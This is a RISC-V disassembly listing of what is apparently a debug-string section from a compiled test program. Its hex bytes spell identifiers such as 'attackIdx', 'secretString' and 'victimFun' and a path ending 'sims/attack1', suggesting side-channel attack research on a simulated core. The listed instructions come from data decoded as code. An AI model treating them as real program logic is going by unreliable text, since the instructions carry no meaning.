  b6:	6d5f 7262 6f74      	0x6f7472626d5f
  bc:	735f6377          	0x735f6377
  c0:	6174                	ld	a3,192(a0)
  c2:	6574                	ld	a3,200(a0)
  c4:	7200                	ld	s0,32(a2)
  c6:	6e61                	lui	t3,0x18
  c8:	4964                	lw	s1,84(a0)
  ca:	7864                	ld	s1,240(s0)
  cc:	5f00                	lw	s0,56(a4)
  ce:	6f746377          	0x6f746377
  d2:	626d                	lui	tp,0x1b
  d4:	735f 6174 6574      	0x65746174735f
  da:	5f00                	lw	s0,56(a4)
  dc:	745f 5f6d 6573      	0x65735f6d745f
  e2:	61770063          	beq	a4,s7,6e2 <_tbss_end+0x65e>
  e6:	4f79                	li	t5,30
  e8:	6666                	ld	a2,88(sp)
  ea:	00746573          	csrrsi	a0,0x7,8
  ee:	6f6c                	ld	a1,216(a4)
  f0:	676e                	ld	a4,216(sp)
  f2:	6c20                	ld	s0,88(s0)
  f4:	20676e6f          	jal	t3,762fa <_tbss_end+0x76276>
  f8:	6e69                	lui	t3,0x1a
  fa:	0074                	addi	a3,sp,12
  fc:	755f 7562 0066      	0x667562755f
 102:	625f 7361 0065      	0x657361625f
 108:	7564                	ld	s1,232(a0)
 10a:	6d6d                	lui	s10,0x1b
 10c:	0079                	c.nop	30
 10e:	5f5f 6d74 685f      	0x685f6d745f5f
 114:	0072756f          	jal	a0,2791a <_tbss_end+0x27896>
 118:	5f5f 6673 5f00      	0x5f0066735f5f
 11e:	655f6e6f          	jal	t3,f6f72 <_tbss_end+0xf6eee>
 122:	6978                	ld	a4,208(a0)
 124:	5f74                	lw	a3,124(a4)
 126:	7261                	lui	tp,0xffff8
 128:	61007367          	0x61007367
 12c:	7474                	ld	a3,232(s0)
 12e:	6361                	lui	t1,0x18
 130:	7864496b          	0x7864496b
 134:	5f00                	lw	s0,56(a4)
 136:	6b6f6f63          	bltu	t5,s6,7f4 <_tbss_end+0x770>
 13a:	6569                	lui	a0,0x1a
 13c:	5f00                	lw	s0,56(a4)
 13e:	735f 6c67 6575      	0x65756c67735f
 144:	5f00                	lw	s0,56(a4)
 146:	6c66                	ld	s8,88(sp)
 148:	6761                	lui	a4,0x18
 14a:	695f0073          	0x695f0073
 14e:	78635f73          	csrrwi	t5,0x786,6
 152:	0061                	c.nop	24
 154:	735f 6474 6e69      	0x6e696474735f
 15a:	6f00                	ld	s0,24(a4)
 15c:	7475                	lui	s0,0xffffd
 15e:	6156                	ld	sp,336(sp)
 160:	416c                	lw	a1,68(a0)
 162:	7272                	ld	tp,312(sp)
 164:	7961                	lui	s2,0xffff8
 166:	5f00                	lw	s0,56(a4)
 168:	6c62                	ld	s8,24(sp)
 16a:	7a69736b          	0x7a69736b
 16e:	0065                	c.nop	25
 170:	20554e47          	fmsub.s	ft8,fa0,ft5,ft4,rmm
 174:	20373143          	fmadd.s	ft2,fa4,ft3,ft4,rup
 178:	2e39                	addiw	t3,t3,14
 17a:	2e32                	fld	ft8,264(sp)
 17c:	2030                	fld	fa2,64(s0)
 17e:	6d2d                	lui	s10,0xb
 180:	646f6d63          	bltu	t5,t1,7da <_tbss_end+0x756>
 184:	6c65                	lui	s8,0x19
 186:	6d3d                	lui	s10,0xf
 188:	6465                	lui	s0,0x19
 18a:	6e61                	lui	t3,0x18
 18c:	2079                	0x2079
 18e:	6d2d                	lui	s10,0xb
 190:	7574                	ld	a3,232(a0)
 192:	656e                	ld	a0,216(sp)
 194:	723d                	lui	tp,0xfffef
 196:	656b636f          	jal	t1,b67ec <_tbss_end+0xb6768>
 19a:	2074                	fld	fa3,192(s0)
 19c:	6d2d                	lui	s10,0xb
 19e:	7261                	lui	tp,0xffff8
 1a0:	723d6863          	bltu	s10,gp,8d0 <_tbss_end+0x84c>
 1a4:	3676                	fld	fa2,376(sp)
 1a6:	6934                	ld	a3,80(a0)
 1a8:	616d                	addi	sp,sp,240
 1aa:	6466                	ld	s0,88(sp)
 1ac:	6d2d2063          	0x6d2d2063
 1b0:	6261                	lui	tp,0x18
 1b2:	3d69                	addiw	s10,s10,-6
 1b4:	706c                	ld	a1,224(s0)
 1b6:	3436                	fld	fs0,360(sp)
 1b8:	2064                	fld	fs1,192(s0)
 1ba:	672d                	lui	a4,0xb
 1bc:	2d20                	fld	fs0,88(a0)
 1be:	2d20304f          	0x2d20304f
 1c2:	6e66                	ld	t3,88(sp)
 1c4:	6f632d6f          	jal	s10,328ba <_tbss_end+0x32836>
 1c8:	6d6d                	lui	s10,0x1b
 1ca:	2d206e6f          	jal	t3,649c <_tbss_end+0x6418>
 1ce:	6e66                	ld	t3,88(sp)
 1d0:	75622d6f          	jal	s10,22926 <_tbss_end+0x228a2>
 1d4:	6c69                	lui	s8,0x1a
 1d6:	6974                	ld	a3,208(a0)
 1d8:	2d6e                	fld	fs10,216(sp)
 1da:	7270                	ld	a2,224(a2)
 1dc:	6e69                	lui	t3,0x1a
 1de:	6674                	ld	a3,200(a2)
 1e0:	5f00                	lw	s0,56(a4)
 1e2:	62747663          	bgeu	s0,t2,80e <_tbss_end+0x78a>
 1e6:	6675                	lui	a2,0x1d
 1e8:	5f00                	lw	s0,56(a4)
 1ea:	7366666f          	jal	a2,66920 <_tbss_end+0x6689c>
 1ee:	7465                	lui	s0,0xffff9
 1f0:	5f00                	lw	s0,56(a4)
 1f2:	626d                	lui	tp,0x1b
 1f4:	6f747273          	csrrci	tp,0x6f7,8
 1f8:	5f736377          	0x5f736377
 1fc:	74617473          	csrrci	s0,0x746,2
 200:	0065                	c.nop	25
 202:	6d5f 7262 656c      	0x656c72626d5f
 208:	5f6e                	lw	t5,248(sp)
 20a:	74617473          	csrrci	s0,0x746,2
 20e:	0065                	c.nop	25
 210:	665f 616e 6772      	0x6772616e665f
 216:	665f0073          	0x665f0073
 21a:	736e                	ld	t1,248(sp)
 21c:	5f00                	lw	s0,56(a4)
 21e:	6e676973          	csrrsi	s2,0x6e6,14
 222:	5f00                	lw	s0,56(a4)
 224:	745f 706d 5f00      	0x5f00706d745f
 22a:	6c66                	ld	s8,88(sp)
 22c:	5f6b636f          	jal	t1,b6822 <_tbss_end+0xb679e>
 230:	0074                	addi	a3,sp,12
 232:	735f 6474 7265      	0x72656474735f
 238:	0072                	c.slli	zero,0x1c
 23a:	425f 6769 6e69      	0x6e696769425f
 240:	0074                	addi	a3,sp,12
 242:	675f 6d61 616d      	0x616d6d61675f
 248:	735f 6769 676e      	0x676e6769735f
 24e:	6d61                	lui	s10,0x18
 250:	5f00                	lw	s0,56(a4)
 252:	6572                	ld	a0,280(sp)
 254:	6461                	lui	s0,0x18
 256:	5f00                	lw	s0,56(a4)
 258:	6572                	ld	a0,280(sp)
 25a:	746c7573          	csrrci	a0,0x746,24
 25e:	6b5f 5f00 745f      	0x745f5f006b5f
 264:	006d                	c.nop	27
 266:	6e69                	lui	t3,0x1a
 268:	7241                	lui	tp,0xffff0
 26a:	6172                	ld	sp,280(sp)
 26c:	5379                	li	t1,-2
 26e:	7a69                	lui	s4,0xffffa
 270:	0065                	c.nop	25
 272:	5f5f 6377 6268      	0x626863775f5f
 278:	5f00                	lw	s0,56(a4)
 27a:	6f647473          	csrrci	s0,0x6f6,8
 27e:	7475                	lui	s0,0xffffd
 280:	5f00                	lw	s0,56(a4)
 282:	6c747663          	bgeu	s0,t2,94e <_tbss_end+0x8ca>
 286:	6e65                	lui	t3,0x19
 288:	6900                	ld	s0,16(a0)
 28a:	416e                	lw	sp,216(sp)
 28c:	7272                	ld	tp,312(sp)
 28e:	7961                	lui	s2,0xffff8
 290:	5f00                	lw	s0,56(a4)
 292:	7364                	ld	s1,224(a4)
 294:	61685f6f          	jal	t5,858aa <_tbss_end+0x85826>
 298:	646e                	ld	s0,216(sp)
 29a:	656c                	ld	a1,200(a0)
 29c:	5f00                	lw	s0,56(a4)
 29e:	696e                	ld	s2,216(sp)
 2a0:	0073626f          	jal	tp,36aa6 <_tbss_end+0x36a22>
 2a4:	726f6873          	csrrsi	a6,0x726,30
 2a8:	2074                	fld	fa3,192(s0)
 2aa:	6e75                	lui	t3,0x1d
 2ac:	6e676973          	csrrsi	s2,0x6e6,14
 2b0:	6465                	lui	s0,0x19
 2b2:	6920                	ld	s0,80(a0)
 2b4:	746e                	ld	s0,248(sp)
 2b6:	5f00                	lw	s0,56(a4)
 2b8:	7461                	lui	s0,0xffff8
 2ba:	7865                	lui	a6,0xffff9
 2bc:	7469                	lui	s0,0xffffa
 2be:	0030                	addi	a2,sp,8
 2c0:	6c66                	ld	s8,88(sp)
 2c2:	7375                	lui	t1,0xffffd
 2c4:	4368                	lw	a0,68(a4)
 2c6:	6361                	lui	t1,0x18
 2c8:	6568                	ld	a0,200(a0)
 2ca:	5f00                	lw	s0,56(a4)
 2cc:	6e676973          	csrrsi	s2,0x6e6,14
 2d0:	6c61                	lui	s8,0x18
 2d2:	625f 6675 5f00      	0x5f006675625f
 2d8:	7361                	lui	t1,0xffff8
 2da:	6d697463          	bgeu	s2,s6,9a2 <_tbss_end+0x91e>
 2de:	5f65                	li	t5,-7
 2e0:	7562                	ld	a0,56(sp)
 2e2:	0066                	c.slli	zero,0x19
 2e4:	725f 7365 6c75      	0x6c757365725f
 2ea:	0074                	addi	a3,sp,12
 2ec:	5f5f 6377 0068      	0x6863775f5f
 2f2:	746e6977          	0x746e6977
 2f6:	745f 5f00 6f6c      	0x6f6c5f00745f
 2fc:	5f006b63          	bltu	zero,a6,8f2 <_tbss_end+0x86e>
 300:	6c66                	ld	s8,88(sp)
 302:	6761                	lui	a4,0x18
 304:	76003273          	csrrc	tp,0x760,zero
 308:	6369                	lui	t1,0x1a
 30a:	6974                	ld	a3,208(a0)
 30c:	466d                	li	a2,27
 30e:	6e75                	lui	t3,0x1d
 310:	775f0063          	beq	t5,s5,a70 <_tbss_end+0x9ec>
 314:	6972                	ld	s2,280(sp)
 316:	6574                	ld	a3,200(a0)
 318:	5f00                	lw	s0,56(a4)
 31a:	745f 5f6d 6579      	0x65795f6d745f
 320:	7261                	lui	tp,0xffff8
 322:	7500                	ld	s0,40(a0)
 324:	756e                	ld	a0,248(sp)
 326:	32646573          	csrrsi	a0,mhpmevent6,8
 32a:	6f00                	ld	s0,24(a4)
 32c:	7475                	lui	s0,0xffffd
 32e:	7570                	ld	a2,232(a0)
 330:	0074                	addi	a3,sp,12
 332:	6e5f 616d 6c6c      	0x6c6c616d6e5f
 338:	7400636f          	jal	t1,6a78 <_tbss_end+0x69f4>
 33c:	7754706f          	j	482b0 <_tbss_end+0x4822c>
 340:	7864496f          	jal	s2,44ac6 <_tbss_end+0x44a42>
 344:	6c00                	ld	s0,24(s0)
 346:	20676e6f          	jal	t3,7654c <_tbss_end+0x764c8>
 34a:	6f64                	ld	s1,216(a4)
 34c:	6275                	lui	tp,0x1d
 34e:	656c                	ld	a1,200(a0)
 350:	5f00                	lw	s0,56(a4)
 352:	656e                	ld	a0,216(sp)
 354:	7478                	ld	a4,232(s0)
 356:	0066                	c.slli	zero,0x19
 358:	72636573          	csrrsi	a0,0x726,6
 35c:	7465                	lui	s0,0xffff9
 35e:	69727453          	0x69727453
 362:	676e                	ld	a4,216(sp)
 364:	5f00                	lw	s0,56(a4)
 366:	745f 5f6d 6f6d      	0x6f6d5f6d745f
 36c:	006e                	c.slli	zero,0x1b
 36e:	615f 6574 6978      	0x69786574615f
 374:	0074                	addi	a3,sp,12
 376:	6f627573          	csrrci	a0,0x6f6,4
 37a:	7470                	ld	a2,232(s0)
 37c:	7261                	lui	tp,0xffff8
 37e:	5f5f0067          	jr	1525(t5)
 382:	64696473          	csrrsi	s0,0x646,18
 386:	6e69                	lui	t3,0x1a
 388:	7469                	lui	s0,0xffffa
 38a:	5f00                	lw	s0,56(a4)
 38c:	5f66666f          	jal	a2,66982 <_tbss_end+0x668fe>
 390:	0074                	addi	a3,sp,12
 392:	7261                	lui	tp,0xffff8
 394:	6172                	ld	sp,280(sp)
 396:	3179                	addiw	sp,sp,-2
 398:	6100                	ld	s0,0(a0)
 39a:	7272                	ld	tp,312(sp)
 39c:	7961                	lui	s2,0xffff8
 39e:	0032                	c.slli	zero,0xc
 3a0:	5f5f 6975 746e      	0x746e69755f5f
 3a6:	3436                	fld	fs0,360(sp)
 3a8:	745f 7500 5469      	0x54697500745f
 3ae:	6d65                	lui	s10,0x19
 3b0:	0070                	addi	a2,sp,12
 3b2:	665f 6572 6c65      	0x6c656572665f
 3b8:	7369                	lui	t1,0xffffa
 3ba:	0074                	addi	a3,sp,12
 3bc:	4c5f 434f 5f4b      	0x5f4b434f4c5f
 3c2:	4552                	lw	a0,20(sp)
 3c4:	53525543          	fmadd.d	fa0,ft4,fs5,fa0,unknown
 3c8:	5649                	li	a2,-14
 3ca:	5f45                	li	t5,-15
 3cc:	0054                	addi	a3,sp,4
 3ce:	756e                	ld	a0,248(sp)
 3d0:	536d                	li	t1,-5
 3d2:	7465                	lui	s0,0xffff9
 3d4:	656c4373          	0x656c4373
 3d8:	7261                	lui	tp,0xffff8
 3da:	7500                	ld	s0,40(a0)
 3dc:	736e                	ld	t1,248(sp)
 3de:	6769                	lui	a4,0x1a
 3e0:	656e                	ld	a0,216(sp)
 3e2:	2064                	fld	fs1,192(s0)
 3e4:	72616863          	bltu	sp,t1,b14 <_tbss_end+0xa90>
 3e8:	6400                	ld	s0,8(s0)
 3ea:	6d75                	lui	s10,0x1d
 3ec:	796d                	lui	s2,0xffffb
 3ee:	654d                	lui	a0,0x13
 3f0:	006d                	c.nop	27
 3f2:	6e5f 7765 5f00      	0x5f0077656e5f
 3f8:	5f68                	lw	a0,124(a4)
 3fa:	7265                	lui	tp,0xffff9
 3fc:	6e72                	ld	t3,280(sp)
 3fe:	6873006f          	j	31284 <_tbss_end+0x31200>
 402:	2074726f          	jal	tp,47e08 <_tbss_end+0x47d84>
 406:	6e69                	lui	t3,0x1a
 408:	0074                	addi	a3,sp,12
 40a:	5f5f 6d74 795f      	0x795f6d745f5f
 410:	6164                	ld	s1,192(a0)
 412:	0079                	c.nop	30
 414:	5f5f 6273 6675      	0x667562735f5f
 41a:	5f00                	lw	s0,56(a4)
 41c:	6f69                	lui	t5,0x1a
 41e:	7362                	ld	t1,56(sp)
 420:	5f00                	lw	s0,56(a4)
 422:	465f 4c49 0045      	0x454c49465f
 428:	6d5f 7362 6174      	0x617473626d5f
 42e:	6574                	ld	a3,200(a0)
 430:	745f 5f00 735f      	0x735f5f00745f
 436:	4946                	lw	s2,80(sp)
 438:	454c                	lw	a1,12(a0)
 43a:	5f00                	lw	s0,56(a4)
 43c:	626d                	lui	tp,0x1b
 43e:	74617473          	csrrci	s0,0x746,2
 442:	0065                	c.nop	25
 444:	725f 6e61 5f64      	0x5f646e61725f
 44a:	656e                	ld	a0,216(sp)
 44c:	7478                	ld	a4,232(s0)
 44e:	5f00                	lw	s0,56(a4)
 450:	626d                	lui	tp,0x1b
 452:	656c                	ld	a1,200(a0)
 454:	5f6e                	lw	t5,248(sp)
 456:	74617473          	csrrci	s0,0x746,2
 45a:	0065                	c.nop	25
 45c:	695f 636e 5f00      	0x5f00636e695f
 462:	6e69                	lui	t3,0x1a
 464:	0064                	addi	s1,sp,12
 466:	6c5f 636f 6c61      	0x6c61636f6c5f
 46c:	0065                	c.nop	25
 46e:	5f5f 6c63 6165      	0x61656c635f5f
 474:	756e                	ld	a0,248(sp)
 476:	0070                	addi	a2,sp,12
 478:	755f 736e 6570      	0x6570736e755f
 47e:	69666963          	bltu	a2,s6,b10 <_tbss_end+0xa8c>
 482:	6465                	lui	s0,0x19
 484:	6c5f 636f 6c61      	0x6c61636f6c5f
 48a:	5f65                	li	t5,-7
 48c:	6e69                	lui	t3,0x1a
 48e:	6f66                	ld	t5,88(sp)
 490:	5f00                	lw	s0,56(a4)
 492:	616d                	addi	sp,sp,240
 494:	7778                	ld	a4,232(a4)
 496:	7364                	ld	s1,224(a4)
 498:	5f00                	lw	s0,56(a4)
 49a:	6572                	ld	a0,280(sp)
 49c:	6e65                	lui	t3,0x19
 49e:	0074                	addi	a3,sp,12
 4a0:	735f 6565 0064      	0x646565735f
 4a6:	5f5f 6f63 6e75      	0x6e756f635f5f
 4ac:	0074                	addi	a3,sp,12
 4ae:	5f5f 6176 756c      	0x756c61765f5f
 4b4:	0065                	c.nop	25
 4b6:	735f 6565 006b      	0x6b6565735f
 4bc:	665f 6f70 5f73      	0x5f736f70665f
 4c2:	0074                	addi	a3,sp,12
 4c4:	5f5f 6d74 6d5f      	0x6d5f6d745f5f
 4ca:	6e69                	lui	t3,0x1a
 4cc:	6300                	ld	s0,0(a4)
 4ce:	6449                	lui	s0,0x12
 4d0:	0078                	addi	a4,sp,12
 4d2:	4974756f          	jal	a0,48168 <_tbss_end+0x480e4>
 4d6:	7864                	ld	s1,240(s0)
 4d8:	7241                	lui	tp,0xffff0
 4da:	6172                	ld	sp,280(sp)
 4dc:	0079                	c.nop	30
 4de:	6d5f 6c75 0074      	0x746c756d5f
 4e4:	735f 7274 6f74      	0x6f747274735f
 4ea:	616c5f6b          	0x616c5f6b
 4ee:	64007473          	csrrci	s0,0x640,0
 4f2:	6669                	lui	a2,0x1a
 4f4:	0066                	c.slli	zero,0x19
 4f6:	665f 746e 7079      	0x7079746e665f
 4fc:	7365                	lui	t1,0xffff9
 4fe:	5f00                	lw	s0,56(a4)
 500:	6461                	lui	s0,0x18
 502:	0064                	addi	s1,sp,12
 504:	5f5f 4c55 6e6f      	0x6e6f4c555f5f
 50a:	675f0067          	jr	1653(t5) # 1a675 <_tbss_end+0x1a5f1>
 50e:	7465                	lui	s0,0xffff9
 510:	6164                	ld	s1,192(a0)
 512:	6574                	ld	a3,200(a0)
 514:	655f 7272 5f00      	0x5f007272655f
 51a:	626f6c67          	0x626f6c67
 51e:	6c61                	lui	s8,0x18
 520:	695f 706d 7275      	0x7275706d695f
 526:	5f65                	li	t5,-7
 528:	7470                	ld	a2,232(s0)
 52a:	0072                	c.slli	zero,0x1c
 52c:	6c61                	lui	s8,0x18
 52e:	6769                	lui	a4,0x1a
 530:	656e                	ld	a0,216(sp)
 532:	4d64                	lw	s1,92(a0)
 534:	6d65                	lui	s10,0x19
 536:	5f00                	lw	s0,56(a4)
 538:	6e75                	lui	t3,0x1d
 53a:	7375                	lui	t1,0xffffd
 53c:	6465                	lui	s0,0x19
 53e:	725f 6e61 0064      	0x646e61725f
 544:	6d6f682f          	0x6d6f682f
 548:	2f65                	addiw	t5,t5,25
 54a:	6e656863          	bltu	a0,t1,c3a <_tbss_end+0xbb6>
 54e:	61697867          	0x61697867
 552:	2f75796f          	jal	s2,58048 <_tbss_end+0x57fc4>
 556:	70696863          	bltu	s2,t1,c66 <_tbss_end+0xbe2>
 55a:	6179                	addi	sp,sp,464
 55c:	6472                	ld	s0,280(sp)
 55e:	6d69732f          	0x6d69732f
 562:	74612f73          	csrrs	t5,0x746,sp
 566:	6174                	ld	a3,192(a0)
 568:	00316b63          	bltu	sp,gp,57e <_tbss_end+0x4fa>
 56c:	665f 6c69 0065      	0x656c69665f
 572:	775f 7364 5f00      	0x5f007364775f
 578:	745f 5f6d 6477      	0x64775f6d745f
 57e:	7961                	lui	s2,0xffff8
 580:	5f00                	lw	s0,56(a4)
 582:	65756c67          	0x65756c67
 586:	5f00                	lw	s0,56(a4)
 588:	7a697373          	csrrci	t1,0x7a6,18
 58c:	5f65                	li	t5,-7
 58e:	0074                	addi	a3,sp,12
 590:	6c5f 3436 5f61      	0x5f6134366c5f
 596:	7562                	ld	a0,56(sp)
 598:	0066                	c.slli	zero,0x19
 59a:	735f 6769 665f      	0x665f6769735f
 5a0:	6e75                	lui	t3,0x1d
 5a2:	6e5f0063          	beq	t5,t0,c82 <_tbss_end+0xbfe>
 5a6:	7562                	ld	a0,56(sp)
 5a8:	0066                	c.slli	zero,0x19
 5aa:	755f 756e 6573      	0x6573756e755f
 5b0:	0064                	addi	s1,sp,12
 5b2:	5f5f 6d74 695f      	0x695f6d745f5f
 5b8:	74736473          	csrrsi	s0,0x747,6
 5bc:	5f00                	lw	s0,56(a4)
 5be:	6f6c                	ld	a1,216(a4)
 5c0:	746c6163          	bltu	s8,t1,d02 <_tbss_end+0xc7e>
 5c4:	6d69                	lui	s10,0x1a
 5c6:	5f65                	li	t5,-7
 5c8:	7562                	ld	a0,56(sp)
 5ca:	0066                	c.slli	zero,0x19
 5cc:	635f 6f6c 6573      	0x65736f6c635f
 5d2:	5f00                	lw	s0,56(a4)
 5d4:	3472                	fld	fs0,312(sp)
 5d6:	0038                	addi	a4,sp,8
 5d8:	72617473          	csrrci	s0,0x726,2
 5dc:	0074                	addi	a3,sp,12
 5de:	6d5f 7462 776f      	0x776f74626d5f
 5e4:	74735f63          	bge	t1,t2,d42 <_tbss_end+0xcbe>
 5e8:	7461                	lui	s0,0xffff8
 5ea:	0065                	c.nop	25
 5ec:	6572                	ld	a0,280(sp)
 5ee:	746c7573          	csrrci	a0,0x746,24
 5f2:	705f0073          	0x705f0073
 5f6:	7335                	lui	t1,0xfffed
 5f8:	6100                	ld	s0,0(a0)
 5fa:	7272                	ld	tp,312(sp)
 5fc:	7961                	lui	s2,0xffff8
 5fe:	5f31                	li	t5,-20
 600:	6d007a73          	csrrci	s4,0x6d0,0
 604:	6961                	lui	s2,0x18
 606:	006e                	c.slli	zero,0x1b
 608:	5f5f 6d74 6d5f      	0x6d5f6d745f5f
 60e:	6164                	ld	s1,192(a0)
 610:	0079                	c.nop	30
 612:	2f637273          	csrrci	tp,0x2f6,6
 616:	2e747263          	bgeu	s0,t2,8fa <_tbss_end+0x876>
 61a:	4e470053          	0x4e470053
 61e:	2055                	0x2055
 620:	5341                	li	t1,-16
 622:	3220                	fld	fs0,96(a2)
 624:	332e                	fld	ft6,232(sp)
 626:	0032                	c.slli	zero,0xc
 628:	2f637273          	csrrci	tp,0x2f6,6
 62c:	63617473          	csrrci	s0,0x636,2
 630:	00532e6b          	0x532e6b
 634:	616e                	ld	sp,216(sp)
 636:	656d                	lui	a0,0x1b
 638:	5f00                	lw	s0,56(a4)
 63a:	6c74                	ld	a3,216(s0)
 63c:	61645f73          	csrrwi	t5,0x616,8
 640:	6174                	ld	a3,192(a0)
 642:	7300                	ld	s0,32(a4)
 644:	7274                	ld	a3,224(a2)
 646:	656c                	ld	a1,200(a0)
 648:	006e                	c.slli	zero,0x1b
 64a:	7270                	ld	a2,224(a2)
 64c:	6e69                	lui	t3,0x1a
 64e:	4174                	lw	a3,68(a0)
 650:	7272                	ld	tp,312(sp)
 652:	7961                	lui	s2,0xffff8
 654:	6300                	ld	s0,0(a4)
 656:	7561                	lui	a0,0xffff8
 658:	73006573          	csrrsi	a0,0x730,0
 65c:	7274                	ld	a3,224(a2)
 65e:	6c6e                	ld	s8,216(sp)
 660:	6e65                	lui	t3,0x19
 662:	7000                	ld	s0,32(s0)
 664:	6f72                	ld	t5,280(sp)
 666:	73736563          	bltu	t1,s7,d90 <_tbss_end+0xd0c>
 66a:	705f 6572 6963      	0x69636572705f
 670:	6e6f6973          	csrrsi	s2,0x6e6,30
 674:	7400                	ld	s0,40(s0)
 676:	6164                	ld	s1,192(a0)
 678:	6174                	ld	a3,192(a0)
 67a:	735f 7a69 0065      	0x657a69735f
 680:	745f 6164 6174      	0x61746164745f
 686:	655f 646e 6700      	0x6700646e655f
 68c:	7465                	lui	s0,0xffff9
 68e:	6975                	lui	s2,0x1d
 690:	746e                	ld	s0,248(sp)
 692:	7000                	ld	s0,32(s0)
 694:	7475                	lui	s0,0xffffd
 696:	72616863          	bltu	sp,t1,dc6 <_tbss_end+0xd42>
 69a:	7200                	ld	s0,32(a2)
 69c:	6765                	lui	a4,0x19
 69e:	72700073          	0x72700073
 6a2:	6e69                	lui	t3,0x1a
 6a4:	7374                	ld	a3,224(a4)
 6a6:	7274                	ld	a3,224(a2)
 6a8:	6200                	ld	s0,0(a2)
 6aa:	7261                	lui	tp,0xffff8
 6ac:	6972                	ld	s2,280(sp)
 6ae:	7265                	lui	tp,0xffff9
 6b0:	6800                	ld	s0,16(s0)
 6b2:	6e61                	lui	t3,0x18
 6b4:	6c64                	ld	s1,216(s0)
 6b6:	5f65                	li	t5,-7
 6b8:	7274                	ld	a3,224(a2)
 6ba:	7061                	c.lui	zero,0xffff8
 6bc:	7400                	ld	s0,40(s0)
 6be:	7268                	ld	a0,224(a2)
 6c0:	6165                	addi	sp,sp,112
 6c2:	5f64                	lw	s1,124(a4)
 6c4:	6e65                	lui	t3,0x19
 6c6:	7274                	ld	a3,224(a2)
 6c8:	0079                	c.nop	30
 6ca:	63727473          	csrrci	s0,0x637,4
 6ce:	7970                	ld	a2,240(a0)
 6d0:	7000                	ld	s0,32(s0)
 6d2:	6972                	ld	s2,280(sp)
 6d4:	746e                	ld	s0,248(sp)
 6d6:	756e                	ld	a0,248(sp)
 6d8:	006d                	c.nop	27
 6da:	6e65                	lui	t3,0x19
 6dc:	6261                	lui	tp,0x18
 6de:	656c                	ld	a1,200(a0)
 6e0:	6100                	ld	s0,0(a0)
 6e2:	6f62                	ld	t5,24(sp)
 6e4:	7472                	ld	s0,312(sp)
 6e6:	5f00                	lw	s0,56(a4)
 6e8:	675f 756e 5f63      	0x5f63756e675f
 6ee:	6176                	ld	sp,344(sp)
 6f0:	6c5f 7369 0074      	0x7473696c5f
 6f6:	6170                	ld	a2,192(a0)
 6f8:	6364                	ld	s1,192(a4)
 6fa:	7300                	ld	s0,32(a4)
 6fc:	6372                	ld	t1,280(sp)
 6fe:	7379732f          	0x7379732f
 702:	6c6c6163          	bltu	s8,t1,dc4 <_tbss_end+0xd40>
 706:	00632e73          	csrrs	t3,0x6,t1
 70a:	74646977          	0x74646977
 70e:	0068                	addi	a0,sp,12
 710:	30727473          	csrrci	s0,0x307,4
 714:	6300                	ld	s0,0(a4)
 716:	746e756f          	jal	a0,e7e5c <_tbss_end+0xe7dd8>
 71a:	7265                	lui	tp,0xffff9
 71c:	6f630073          	0x6f630073
 720:	6564                	ld	s1,200(a0)
 722:	6c00                	ld	s0,24(s0)
 724:	7366                	ld	t1,120(sp)
 726:	0072                	c.slli	zero,0x1c
 728:	616c                	ld	a1,192(a0)
 72a:	665f7473          	csrrci	s0,0x665,30
 72e:	746d                	lui	s0,0xffffb
 730:	6200                	ld	s0,0(a2)
 732:	6675                	lui	a2,0x1d
 734:	656c                	ld	a1,200(a0)
 736:	006e                	c.slli	zero,0x1b
 738:	6572                	ld	a0,280(sp)
 73a:	74697773          	csrrci	a4,0x746,18
 73e:	73006863          	bltu	zero,a6,e6e <_tbss_end+0xdea>
 742:	7274                	ld	a3,224(a2)
 744:	00706d63          	bltu	zero,t2,75e <_tbss_end+0x6da>
 748:	7270                	ld	a2,224(a2)
 74a:	6e69                	lui	t3,0x1a
 74c:	4474                	lw	a3,76(s0)
 74e:	6c62756f          	jal	a0,27e14 <_tbss_end+0x27d90>
 752:	4165                	li	sp,25
 754:	7272                	ld	tp,312(sp)
 756:	7961                	lui	s2,0xffff8
 758:	6c00                	ld	s0,24(s0)
 75a:	6c66                	ld	s8,88(sp)
 75c:	6761                	lui	a4,0x18
 75e:	7000                	ld	s0,32(s0)
 760:	00727473          	csrrci	s0,0x7,4
 764:	656d                	lui	a0,0x1b
 766:	736d                	lui	t1,0xffffb
 768:	7465                	lui	s0,0xffff9
 76a:	6100                	ld	s0,0(a0)
 76c:	6772                	ld	a4,280(sp)
 76e:	0030                	addi	a2,sp,8
 770:	7261                	lui	tp,0xffff8
 772:	61003167          	0x61003167
 776:	6772                	ld	a4,280(sp)
 778:	0032                	c.slli	zero,0xc
 77a:	695f 696e 0074      	0x74696e695f
 780:	63737973          	csrrci	s2,0x637,6
 784:	6c61                	lui	s8,0x18
 786:	006c                	addi	a1,sp,12
 788:	6576                	ld	a0,344(sp)
 78a:	6972                	ld	s2,280(sp)
 78c:	7966                	ld	s2,120(sp)
 78e:	6f44                	ld	s1,152(a4)
 790:	6275                	lui	tp,0x1d
 792:	656c                	ld	a1,200(a0)
 794:	6700                	ld	s0,8(a4)
 796:	7465                	lui	s0,0xffff9
 798:	6e69                	lui	t3,0x1a
 79a:	0074                	addi	a3,sp,12
 79c:	6e75                	lui	t3,0x1d
 79e:	6e676973          	csrrsi	s2,0x6e6,14
 7a2:	6465                	lui	s0,0x19
 7a4:	6e5f 6d75 6562      	0x65626d756e5f
 7aa:	0072                	c.slli	zero,0x1c
 7ac:	7570                	ld	a2,232(a0)
 7ae:	6474                	ld	a3,200(s0)
 7b0:	7461                	lui	s0,0xffff8
 7b2:	6100                	ld	s0,0(a0)
 7b4:	6772                	ld	a4,280(sp)
 7b6:	68770063          	beq	a4,t2,e36 <_tbss_end+0xdb2>
 7ba:	6369                	lui	t1,0x1a
 7bc:	0068                	addi	a0,sp,12
 7be:	7261                	lui	tp,0xffff8
 7c0:	73007667          	0x73007667
 7c4:	7270                	ld	a2,224(a2)
 7c6:	6e69                	lui	t3,0x1a
 7c8:	6674                	ld	a3,200(a2)
 7ca:	5f00                	lw	s0,56(a4)
 7cc:	6474                	ld	a3,200(s0)
 7ce:	7461                	lui	s0,0xffff8
 7d0:	5f61                	li	t5,-8
 7d2:	6562                	ld	a0,24(sp)
 7d4:	006e6967          	0x6e6967
 7d8:	636e                	ld	t1,216(sp)
 7da:	7365726f          	jal	tp,57f10 <_tbss_end+0x57e8c>
 7de:	5f00                	lw	s0,56(a4)
 7e0:	755f 6e69 7074      	0x70746e69755f
 7e6:	7274                	ld	a3,224(a2)
 7e8:	745f 6100 746c      	0x746c6100745f
 7ee:	6c66                	ld	s8,88(sp)
 7f0:	6761                	lui	a4,0x18
 7f2:	7400                	ld	s0,40(s0)
 7f4:	7362                	ld	t1,56(sp)
